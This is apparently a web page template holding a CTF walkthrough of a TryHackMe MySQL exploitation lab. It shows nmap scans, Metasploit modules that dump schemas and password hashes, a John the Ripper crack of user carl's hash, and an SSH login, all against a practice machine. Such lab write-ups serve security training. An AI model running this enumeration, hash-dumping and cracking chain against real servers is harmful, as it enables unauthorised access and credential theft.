{% extends "base.html" %}{% block title %}Intro to Networking{%endblock%}
{% block content %}

<div class="container">
    <h1 id="typing-effect" class="display-2 mb-4"></h1> 
    <br />

    <div class="solution-div">

    <p>In this page I show how to solve the Exploiting MySQL - Network Services 2 room CTF on TryHackMe platform.
    </p>

    <h2>Enumeration</h2>

    <p>Let's start our enumeration process with Nmap port scanning. A simple nmap gives us:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap 10.10.100.137 -oN simple-nmap.out                    
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 23:52 -03
            Nmap scan report for 10.10.100.137
            Host is up (0.24s latency).
            Not shown: 998 closed tcp ports (conn-refused)
            PORT     STATE SERVICE
            22/tcp   open  ssh
            3306/tcp open  mysql
                
            Nmap done: 1 IP address (1 host up) scanned in 25.33 seconds                      
            </code>
        </pre>
    </div>

    <p>
        We have found that port 3306 is hosting a MySQL server. Let's run an aggressive scan now on this port to see if we gather 
        more information.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap -p 3306 -A 10.10.100.137 -oN aggressive-p3306-nmap.out
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 23:56 -03
            Nmap scan report for 10.10.100.137
            Host is up (0.24s latency).
                
            PORT     STATE SERVICE VERSION
            3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
            | mysql-info: 
            |   Protocol: 10
            |   Version: 5.7.29-0ubuntu0.18.04.1
            |   Thread ID: 5
            |   Capabilities flags: 65535
            |   Some Capabilities: FoundRows, Support41Auth, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, LongPassword, SupportsTransactions, SupportsCompression, Speaks41ProtocolOld, LongColumnFlag, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
            |   Status: Autocommit
            |   Salt: xfX8tgg.\x1EO\x19W G@E0j\x0B\x01
            |_  Auth Plugin Name: mysql_native_password
            | ssl-cert: Subject: commonName=MySQL_Server_5.7.29_Auto_Generated_Server_Certificate
            | Not valid before: 2020-04-23T10:13:27
            |_Not valid after:  2030-04-21T10:13:27
            |_ssl-date: TLS randomness does not represent time
                
            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 16.27 seconds              
            </code>
        </pre>
    </div>

    <p>
        Note that we have found the version to be MySQL 5.7.29-0ubuntu0.18.04.1, indicating it is running in an Ubuntu server.
        We have also found that the auth plugin is mysql_native_password. This plugin 
        is a commonly used authentication method in MySQL. It uses a native password-based authentication scheme where user credentials (username and password) are stored as a hash in the MySQL database. When a user attempts to log in, the provided password is hashed using the same algorithm, and the resulting hash is compared with the stored hash for authentication.
    </p>

    <p>In this CTF, TryHackMe asks us to use the credentials root:password to connect to the database. Let's try it out.</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ mysql -h 10.10.100.137 -u root -p         
            Enter password: 
            Welcome to the MariaDB monitor.  Commands end with ; or \g.
            Your MySQL connection id is 14
            Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)
            
            Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
                
            Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
                
            MySQL [(none)]>              
            </code>
        </pre>
    </div>

    <p>Indeed it works. Now let's enumerate even further using Metasploit framework. In it, we will use the command: 'use auxiliary/admin/mysql/mysql_sql'.
    </p>

    <p>With the show options command, we see the following:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(admin/mysql/mysql_sql) > show options

            Module options (auxiliary/admin/mysql/mysql_sql):
                
               Name      Current Setting   Required  Description
               ----      ---------------   --------  -----------
               PASSWORD                    no        The password for the specified userna
                                                     me
               RHOSTS                      yes       The target host(s), see https://docs.
                                                         metasploit.com/docs/using-metasploit/
                                                         basics/using-metasploit.html
               RPORT     3306              yes       The target port (TCP)
               SQL       select version()  yes       The SQL to execute.
               USERNAME                    no        The username to authenticate as
                
                
            View the full module info with the info, or info -d command.
            </code>
        </pre>
    </div>

    <p>We know the username and password. They are not required fields, but since we have them, we might as well set them here.
        We also need to set RHOSTS to be the target machine IP address.
    </p>

    
    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.100.137
            RHOSTS => 10.10.100.137
            msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
            USERNAME => root
            msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
            PASSWORD => password
            msf6 auxiliary(admin/mysql/mysql_sql) > run
            [*] Running module against 10.10.100.137
                
            [*] 10.10.100.137:3306 - Sending statement: 'select version()'...
            [*] 10.10.100.137:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
            [*] Auxiliary module execution completed         
            </code>
        </pre>
    </div>

    <p>This scan confirmed that the MySQL version is the same as we found in our aggressive Nmap scan.
        Let's run the exploit again, but setting the SQL option to show databases. This will let us know which 
        databases are within the MySQL server.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
            SQL => show databases
            msf6 auxiliary(admin/mysql/mysql_sql) > run
            [*] Running module against 10.10.100.137
                
            [*] 10.10.100.137:3306 - Sending statement: 'show databases'...
            [*] 10.10.100.137:3306 -  | information_schema |
            [*] 10.10.100.137:3306 -  | mysql |
            [*] 10.10.100.137:3306 -  | performance_schema |
            [*] 10.10.100.137:3306 -  | sys |
            [*] Auxiliary module execution completed  
            </code>
        </pre>
    </div>

    <p>
        Let's see what we have found so far:
    </p>
    
    <ul class="custom-bullet-list">
        <li>MySQL server credentials were provided by the CTF.</li>
        <li>The version of the MySQL server.</li>
        <li>The authentication plugin used in the MySQL server.</li>
        <li>The number of databases, as well as their names.</li>
    </ul>

    <h2>Exploitation</h2>

    <p>Let's select the mysql_schemadump module in Metasploit. This module will help us retrieve table names and information from the databases. To select this module,
        we run 'use auxiliary/scanner/mysql/mysql_schemadump'. The show options command returns:
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            msf6 auxiliary(scanner/mysql/mysql_schemadump) > show options

            Module options (auxiliary/scanner/mysql/mysql_schemadump):
                
               Name             Current Setting  Required  Description
               ----             ---------------  --------  -----------
               DISPLAY_RESULTS  true             yes       Display the Results to the Scre
                                                               en
               PASSWORD                          no        The password for the specified
                                                               username
               RHOSTS                            yes       The target host(s), see https:/
                                                               /docs.metasploit.com/docs/using
                                                               -metasploit/basics/using-metasp
                                                               loit.html
               RPORT            3306             yes       The target port (TCP)
               THREADS          1                yes       The number of concurrent thread
                                                               s (max one per host)
               USERNAME                          no        The username to authenticate as
                
                
            View the full module info with the info, or info -d command.
            </code>
        </pre>
    </div>

    <p>We need to set the RHOSTS, USERNAME and PASSWORD fields again and then run the exploit.</p>

    <p>There's a lot of information returned by this exploit. The CTF asks for the last table name, which is 
        x$waits_global_by_latency. After that, let's select another module. This one is called mysql_hashdump. This 
        module is used to dump the hash passwords. Simple type in 'use auxiliary/scanner/mysql/mysql_hashdump' to use it.
        Again, we need to setup the options. Same as before, then run.
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">  
            msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.100.137
            RHOSTS => 10.10.100.137
            msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
            USERNAME => root
            msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
            PASSWORD => password
            msf6 auxiliary(scanner/mysql/mysql_hashdump) > run
                
            [+] 10.10.100.137:3306    - Saving HashString as Loot: root:
            [+] 10.10.100.137:3306    - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
            [+] 10.10.100.137:3306    - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
            [+] 10.10.100.137:3306    - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
            [+] 10.10.100.137:3306    - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
            [+] 10.10.100.137:3306    - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
            [*] 10.10.100.137:3306    - Scanned 1 of 1 hosts (100% complete)
            [*] Auxiliary module execution completed
            </code>
        </pre>
    </div>

    <p>Note that we have found a username 'carl', which is something we did not know beforehand. Let's copy the full hash to a text file in our 
        machine and use John The Ripper to crack this hash. Usually, John The Ripper can crack MySQL insecure hashes if we are lucky enough.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
                └─$ echo "carl:*EA031893AA21444B170FC2162A56978B8CEECE18" > credentials-hash.txt 
            </code>
        </pre>
    </div>

    <p>
    And then we run:
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ john credentials-hash.txt 
            Created directory: /home/alex/.john
            Using default input encoding: UTF-8
            Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 256/256 AVX2 8x])
            Warning: no OpenMP support for this hash type, consider --fork=4
            Proceeding with single, rules:Single
            Press 'q' or Ctrl-C to abort, almost any other key for status
            Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
            Almost done: Processing the remaining buffered candidate passwords, if any.
            Proceeding with wordlist:/usr/share/john/password.lst
            Proceeding with incremental:ASCII
            doggie           (carl)     
            1g 0:00:00:02 DONE 3/3 (2023-08-24 00:23) 0.4694g/s 1073Kp/s 1073Kc/s 1073KC/s doggie..doggia
            Use the "--show" option to display all of the cracked passwords reliably
            Session completed. 
            </code>
        </pre>
    </div>

    <p>We have found the password to be 'doggie'! Now we can ssh into the machine:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ ssh carl@10.10.100.137
            The authenticity of host '10.10.100.137 (10.10.100.137)' can't be established.
            ED25519 key fingerprint is SHA256:lzPSz2dnAUtAkM53Zn8G50umC6hWdyrSEcfYoFcGqF4.
            This key is not known by any other names.
            Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
            Warning: Permanently added '10.10.100.137' (ED25519) to the list of known hosts.
            carl@10.10.100.137's password: 
            Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)
                
             * Documentation:  https://help.ubuntu.com
             * Management:     https://landscape.canonical.com
             * Support:        https://ubuntu.com/advantage
                
              System information as of Thu Aug 24 03:26:30 UTC 2023
                
              System load:  0.0               Processes:           87
              Usage of /:   41.7% of 9.78GB   Users logged in:     0
              Memory usage: 32%               IP address for eth0: 10.10.100.137
              Swap usage:   0%
                
                
            23 packages can be updated.
            0 updates are security updates.
                
                
            Last login: Thu Apr 23 12:57:41 2020 from 192.168.1.110
            carl@polomysql:~$ ls
            MySQL.txt
            </code>
        </pre>
    </div>


    <p>And the flag is in MySQL.txt!</p>

    <a href="/ctfs">Go back</a>

    </div>

</div>


{% endblock %}